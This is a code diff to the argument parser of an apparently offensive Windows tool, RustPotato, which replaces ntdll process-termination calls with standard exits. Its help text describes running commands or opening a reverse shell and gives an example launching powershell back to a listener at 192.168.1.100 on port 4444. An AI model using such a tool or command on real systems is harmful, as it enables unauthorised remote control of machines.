@@ -1,13 +1,8 @@
-use crate::{
-    _print, run,
-    win32::ntdll::{nt_current_process, ntdll},
-};
+use crate::{_print, run};
 
 pub fn parse_args() {
-    // Get the command-line arguments
     let args: Vec<String> = std::env::args().collect();
 
-    // Ensure there are enough arguments
     if args.len() < 2 {
         _print!(
             "Usage: {} <cmdline> OR -h <host> -p <port> [-c <cmd>]",
@@ -16,9 +11,7 @@ pub fn parse_args() {
         std::process::exit(1);
     }
 
-    // Parse arguments based on the format
     if args[1].starts_with("-") {
-        // Parse the key-value options
         let mut host: Option<String> = None;
         let mut port: Option<u16> = None;
         let mut command: Option<String> = None;
@@ -32,7 +25,7 @@ pub fn parse_args() {
                         i += 1;
                     } else {
                         _print!("[-] Error: Missing value for -h");
-                        unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
+                        std::process::exit(1);
                     }
                 }
                 "-p" => {
@@ -41,15 +34,13 @@ pub fn parse_args() {
                             Ok(p) => port = Some(p),
                             Err(_) => {
                                 _print!("[-] Error: Invalid port value");
-                                unsafe {
-                                    ntdll().nt_terminate_process.run(nt_current_process(), 1)
-                                };
+                                std::process::exit(1);
                             }
                         }
                         i += 1;
                     } else {
                         _print!("[-] Error: Missing value for -p");
-                        unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
+                        std::process::exit(1);
                     }
                 }
                 "-c" => {
@@ -58,7 +49,7 @@ pub fn parse_args() {
                         i += 1;
                     } else {
                         _print!("[-] Error: Missing value for -c");
-                        unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
+                        std::process::exit(1);
                     }
                 }
                 "--help" => {
@@ -71,6 +62,7 @@ Description:
     Execute a command line or start a reverse shell.
 
 Options:
+    <cmdline>           Execute the specified command line.
     -h <LHOST>         Specify the IP address of the listener.
     -p <LPORT>         Specify the port of the listener.
     -c <cmd|powershell>
@@ -85,40 +77,36 @@ Examples:
 
     Start a reverse shell with powershell:
     RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell
-                "#,
+                "#
                     );
-                    unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 0) };
+                    std::process::exit(0);
                 }
                 _ => {
                     _print!("[-] Error: Unknown option {}", args[i]);
-                    unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
+                    std::process::exit(1);
                 }
             }
             i += 1;
         }
 
-        // Validate required arguments
         if host.is_none() || port.is_none() {
             _print!("[-] Error: Both -h and -p are required.");
-            unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
+            std::process::exit(1);
         }
 
-        // Run with parsed options
         run(
-            &command.unwrap_or_else(|| "cmd".to_string()), // Default to "cmd" if -c is not provided
+            &command.unwrap_or_else(|| "cmd".to_string()),
             Some(host.unwrap().as_str()),
             port,
         );
     } else {
-        // Handle the single string argument
         let input_arg = &args[1];
 
         if input_arg.is_empty() {
             _print!("[-] Error: The argument cannot be an empty string.");
-            unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) };
+            std::process::exit(1);
         }
 
-        // Run with the provided command-line string
         run(input_arg, None, None);
     }
 }
